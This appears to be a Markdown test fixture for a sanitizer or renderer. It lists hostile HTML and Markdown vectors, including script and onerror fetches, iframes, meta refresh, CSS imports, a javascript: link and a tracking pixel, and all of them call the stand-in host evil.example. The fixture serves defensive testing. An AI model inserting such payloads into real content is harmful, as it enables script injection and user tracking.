# Hostile fixture

Each `?r=` marker names the vector; none of these may produce a request.

Remote image: ![tracker](https://evil.example/pixel.png?r=image)

<script>fetch('https://evil.example/?r=script')</script>

<img src="x" onerror="fetch('https://evil.example/?r=onerror')">

<img src="https://evil.example/?r=srcset" srcset="https://evil.example/?r=srcset2 2x">

<iframe src="https://evil.example/?r=iframe"></iframe>

<object data="https://evil.example/?r=object"></object>

<form action="https://evil.example/?r=form"><button>go</button></form>

<base href="https://evil.example/">

<meta http-equiv="refresh" content="0; url=https://evil.example/?r=meta">

<style>@import url(https://evil.example/?r=import);</style>

<svg><use href="https://evil.example/?r=svg#a"></use></svg>

[javascript link](javascript:fetch('https://evil.example/?r=js'))

[remote link](https://evil.example/?r=link)

<p style="background:url(https://evil.example/?r=style)">styled paragraph</p>

[in-page anchor](#hostile-fixture)
